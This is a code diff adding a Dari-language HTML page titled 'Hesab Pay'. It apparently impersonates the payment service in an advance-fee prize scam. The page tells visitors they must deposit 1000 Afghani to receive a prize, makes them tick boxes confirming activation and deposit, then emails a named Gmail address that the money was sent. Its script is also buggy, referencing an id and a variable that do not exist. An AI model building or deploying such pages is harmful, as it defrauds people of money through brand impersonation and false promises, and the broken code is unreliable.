@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hesab Pay</title>
+    <link rel="stylesheet" href="hesabPay.css">
+</head>
+<body>
+    <p>برای دریافت جایزه باید حساب خود را فعال<br>و مبلغ ۱۰۰۰ افغانی به حساب خود واریز کنید<br>
+    در غیر آن جایزه به حساب شما واریز نمیشود</p>
+    <p><input type="checkbox" value="yes" required id="heseb">حساب خود را فعال کردم</p>
+    <p><input type="checkbox" value="yes" required id="money">حساب خود را شارژ کردم</p>
+    <button onclick="conTinue()">ادامه</button>
+
+    <script>
+        let a= document.getElementById('hesab').value;
+        let b= document.getElementById('money').value;
+        document.write(a)
+        function conTinue(){
+            let user="The user activated his account and deposited the money";
+            window.location.href='mailto:alfannanmaher@gmail.com?subject پیام جدید&body=' + user;
+
+            if (hesab==true){
+                window.location.href='page5.html'
+            }else {
+            document.write('لطفا حساب خود را فعال و حساب را شارژ کنید')
+        }
+        }
+
+    </script>
+</body>
+</html>
